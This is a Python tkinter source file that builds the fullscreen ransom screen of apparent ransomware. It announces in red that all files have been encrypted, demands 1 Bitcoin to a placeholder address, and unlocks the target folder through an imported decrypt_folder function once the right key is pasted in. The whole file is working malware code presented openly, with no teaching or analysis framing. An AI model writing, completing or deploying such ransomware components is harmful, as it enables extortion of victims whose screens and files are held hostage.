import tkinter as tk
from decryptor import decrypt_folder

def show_lock_screen(correct_key, target_folder):
    def try_decrypt():
        user_key = entry.get().encode()
        if user_key == correct_key:
            decrypt_folder(target_folder, user_key)
            window.destroy()
        else:
            message.config(text="❌ Wrong key. Try again.")

    window = tk.Tk()
    window.title("🔒 Your Files Have Been Encrypted")
    window.attributes('-fullscreen', True)
    window.configure(bg="black")

    tk.Label(window, text="💀 All your files have been encrypted!",
             fg="red", bg="black", font=("Helvetica", 30)).pack(pady=30)
    tk.Label(window, text="Pay 1 Bitcoin to 0x123... and paste the decryption key below",
             fg="white", bg="black", font=("Helvetica", 16)).pack(pady=10)
    
    entry = tk.Entry(window, width=40, font=("Helvetica", 18))
    entry.pack(pady=20)
    tk.Button(window, text="Decrypt Files", command=try_decrypt, font=("Helvetica", 14)).pack(pady=10)
    
    message = tk.Label(window, text="", fg="yellow", bg="black", font=("Helvetica", 14))
    message.pack()

    window.mainloop()
